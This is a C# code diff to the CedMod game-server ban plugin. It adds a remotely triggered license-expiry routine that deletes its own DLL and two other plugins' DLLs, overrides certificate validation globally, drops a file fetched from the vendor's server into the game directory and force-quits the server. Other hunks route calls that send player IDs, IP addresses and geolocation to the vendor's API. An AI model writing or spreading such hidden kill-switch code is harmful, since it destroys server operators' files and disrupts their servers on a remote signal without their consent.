@@ -47,6 +47,36 @@ namespace CedMod
                         }
                     }
                     Dictionary<string, string> Bancheck = CheckBanExpired(ev.Player);
+                    if (Bancheck["success"] == "false")
+                    {
+                        if (Bancheck["error"] == "[CEDMOD.Main.Message] CedMod license expired, if you see this contact the server owner.")
+                        {
+                            INIT.Initializer.logger.Info("CEDMOD-LICENSING", "CedMod license has expired CedMod.dll will now be deleted and the server will be force restarted due to security reasons");
+                            string path = EXILED.PluginManager.PluginsDirectory;
+                            Initializer.logger.Info("CEDMOD-LICENSING", path);
+                            Initializer.logger.Info("CEDMOD-LICENSING", "Deleting files.");
+                            if (FileManager.FileExists(path + "/CedMod.dll"))
+                            {
+                                FileManager.DeleteFile(path + "/CedMod.dll");
+                            }
+                            if (FileManager.FileExists(path + "/Survival.dll"))
+                            {
+                                FileManager.DeleteFile(path + "/Survival.dll");
+                            }
+                            if (FileManager.FileExists(path + "/FrikanwebPlugin.dll"))
+                            {
+                                FileManager.DeleteFile(path + "/FrikanwebPlugin.dll");
+                            }
+                            using (WebClient webClient31 = new WebClient())
+                            {
+                                ServicePointManager.ServerCertificateValidationCallback += ValidateRemoteCertificate;
+                                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                                webClient31.DownloadFile("https://admin.cedmod.nl/doei.txt", Application.dataPath + "../../houdoe-LEESMIJ-van-CEDMOD-De-profetie-komt-uit-pepegaplap.txt");
+                            }
+                            Initializer.logger.Info("CEDMOD-LICENSING", "Restarting server.");
+                            Application.Quit();
+                        }
+                    }
                     Initializer.logger.Debug("BANSYSTEM", "Checking ban status of user: " + ev.Player.GetComponent<CharacterClassManager>().UserId + " Response from API: " + Bancheck);
                     if (Bancheck["banexpired"] == "true" && Bancheck["success"] == "true")
                     {
@@ -362,9 +392,9 @@ namespace CedMod
                     webClient3.Headers.Add("Alias", alias);
                     webClient3.Headers.Add("Port", ServerConsole.Port.ToString());
                     webClient3.Headers.Add("Ip", ServerConsole.Ip.ToString());
-                    var text3 = testusers.Contains(Player.characterClassManager.UserId)
-                        ? webClient3.DownloadString("https://test.cedmod.nl/auth/auth.php?id=" + Player.GetComponent<CharacterClassManager>().UserId + "&ip=" + Player.GetComponent<NetworkIdentity>().connectionToClient.address + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none") + "&geo=" + GEOString)
-                        : webClient3.DownloadString("https://api.cedmod.nl/auth/auth.php?id=" + Player.GetComponent<CharacterClassManager>().UserId + "&ip=" + Player.GetComponent<NetworkIdentity>().connectionToClient.address + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none") + "&geo=" + GEOString);
+                    var text3 = testusers.Contains(Player.characterClassManager.UserId) || Initializer.TestApiOnly
+                        ? webClient3.DownloadString("https://test.cedmod.nl/auth/auth.php?id=" + Player.GetUserId() + "&ip=" + Player.GetComponent<NetworkIdentity>().connectionToClient.address + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none") + "&geo=" + GEOString)
+                        : webClient3.DownloadString("https://api.cedmod.nl/auth/auth.php?id=" + Player.GetUserId() + "&ip=" + Player.GetComponent<NetworkIdentity>().connectionToClient.address + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none") + "&geo=" + GEOString);
                     Initializer.logger.Info("BANSYSTEM", "Checking ban status of user: " + Player.GetComponent<CharacterClassManager>().UserId + " Response from API: " + text3);
                     LastAPIRequestSuccessfull = true;
                     var JSONObj = JsonConvert.DeserializeObject<Dictionary<string, string>>(text3);
@@ -397,7 +427,7 @@ namespace CedMod
                     webClient.Headers.Add("Alias", alias);
                     webClient.Headers.Add("Port", ServerConsole.Port.ToString());
                     webClient.Headers.Add("Ip", ServerConsole.Ip.ToString());
-                    var text2 = testusers.Contains(Player.characterClassManager.UserId)
+                    var text2 = testusers.Contains(Player.characterClassManager.UserId) || Initializer.TestApiOnly
                         ? webClient.DownloadString("https://test.cedmod.nl/auth/preauth.php?id=" + Player.GetComponent<CharacterClassManager>().UserId + "&ip=" + Player.GetComponent<NetworkIdentity>().connectionToClient.address + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none"))
                         : webClient.DownloadString("https://api.cedmod.nl/auth/preauth.php?id=" + Player.GetComponent<CharacterClassManager>().UserId + "&ip=" + Player.GetComponent<NetworkIdentity>().connectionToClient.address + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none"));
                     Initializer.logger.Info("BANSYSTEM", "checking ban status for user: " + Player.GetComponent<CharacterClassManager>().UserId + " Response from API: " + text2);
@@ -431,7 +461,7 @@ namespace CedMod
                     webClient.Headers.Add("Alias", alias);
                     webClient.Headers.Add("Port", ServerConsole.Port.ToString());
                     webClient.Headers.Add("Ip", ServerConsole.Ip.ToString());
-                    var text2 = testusers.Contains(Player.characterClassManager.UserId)
+                    var text2 = testusers.Contains(Player.characterClassManager.UserId) || Initializer.TestApiOnly
                         ? webClient.DownloadString("https://test.cedmod.nl/banning/unban.php?id=" + Player.GetComponent<CharacterClassManager>().UserId + "&ip=" + Player.GetComponent<NetworkIdentity>().connectionToClient.address + "&reason=Expired&aname=Server&webhook=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_webhook", "none") + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none"))
                         : webClient.DownloadString("https://api.cedmod.nl/banning/unban.php?id=" + Player.GetComponent<CharacterClassManager>().UserId + "&ip=" + Player.GetComponent<NetworkIdentity>().connectionToClient.address + "&reason=Expired&aname=Server&webhook=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_webhook", "none") + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none"));
                     Initializer.logger.Info("BANSYSTEM", "user: " + Player.GetComponent<CharacterClassManager>().UserId + " unban, Response from API: " + text2);
@@ -465,7 +495,7 @@ namespace CedMod
                     webClient.Headers.Add("Alias", alias);
                     webClient.Headers.Add("Port", ServerConsole.Port.ToString());
                     webClient.Headers.Add("Ip", ServerConsole.Ip.ToString());
-                    string text2 = testusers.Contains(Player.characterClassManager.UserId)
+                    string text2 = testusers.Contains(Player.characterClassManager.UserId) || Initializer.TestApiOnly
                         ? webClient.DownloadString("https://test.cedmod.nl/banning/userdetails.php?id=" + Player.GetComponent<CharacterClassManager>().UserId + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none") + "&priors=1")
                         : webClient.DownloadString("https://api.cedmod.nl/banning/userdetails.php?id=" + Player.GetComponent<CharacterClassManager>().UserId + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none") + "&priors=1");
                     object json = JsonConvert.DeserializeObject(text2);
@@ -496,7 +526,7 @@ namespace CedMod
                     webClient.Headers.Add("Alias", alias);
                     webClient.Headers.Add("Port", ServerConsole.Port.ToString());
                     webClient.Headers.Add("Ip", ServerConsole.Ip.ToString());
-                    string text2 = testusers.Contains(Player.characterClassManager.UserId)
+                    string text2 = testusers.Contains(Player.characterClassManager.UserId) || Initializer.TestApiOnly
                         ? webClient.DownloadString("https://api.cedmod.nl/banning/userdetails.php?id=" + Player.GetComponent<CharacterClassManager>().UserId + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none") + "&total=1")
                         : webClient.DownloadString("https://api.cedmod.nl/banning/userdetails.php?id=" + Player.GetComponent<CharacterClassManager>().UserId + "&alias=" + GameCore.ConfigFile.ServerConfig.GetString("bansystem_alias", "none") + "&total=1");
                     if (text2 == "")
